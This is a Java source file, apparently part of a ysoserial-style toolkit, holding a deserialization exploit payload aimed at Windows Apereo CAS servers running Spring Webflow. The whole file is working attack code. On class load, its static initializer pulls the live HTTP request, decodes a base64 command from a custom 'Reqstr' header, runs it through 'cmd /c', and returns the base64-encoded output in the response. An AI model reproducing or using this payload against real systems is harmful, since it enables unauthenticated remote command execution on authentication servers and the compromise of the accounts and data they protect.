package ysoserial.payloads.external;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.webflow.context.ExternalContext;
import org.springframework.webflow.context.ExternalContextHolder;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.bind.DatatypeConverter;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.Serializable;


public class Apereocas_win extends AbstractTranslet implements Serializable {
    private static final long serialVersionUID = -5971610431559700674L;

    static {
        try {
            //  org\springframework\webflow\spring-webflow\2.4.1.RELEASE\spring-webflow-2.4.1.RELEASE.jar!\org\springframework\webflow\context\ExternalContextHolder.class
            ExternalContext externalcontext = ExternalContextHolder.getExternalContext();

            // init request and response
            Object request = externalcontext.getNativeRequest();
            Object response = externalcontext.getNativeResponse();
            HttpServletRequest httprequest = (HttpServletRequest) request;
            HttpServletResponse httpresponse = (HttpServletResponse) response;


            // exexute shell to base64
            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getHeader("Reqstr")));
            String[] command = {"cmd", "/c", params};
            InputStream in = Runtime.getRuntime().exec(command).getInputStream();

            // InputStream in = new ProcessBuilder(new String(command)).start().getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] b = new byte[1024];
            int a = -1;

            while ((a = in.read(b)) != -1) {
                baos.write(b, 0, a);
            }

            // return command result to base64
            String base64Str = "";
            base64Str = DatatypeConverter.printBase64Binary(baos.toByteArray());
            httpresponse.getWriter().write(base64Str);

            // over http session
            httpresponse.getWriter().flush();
            httpresponse.getWriter().close();

        } catch (Exception e) {
            //  Block of code to handle errors
            e.getStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }


    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

}
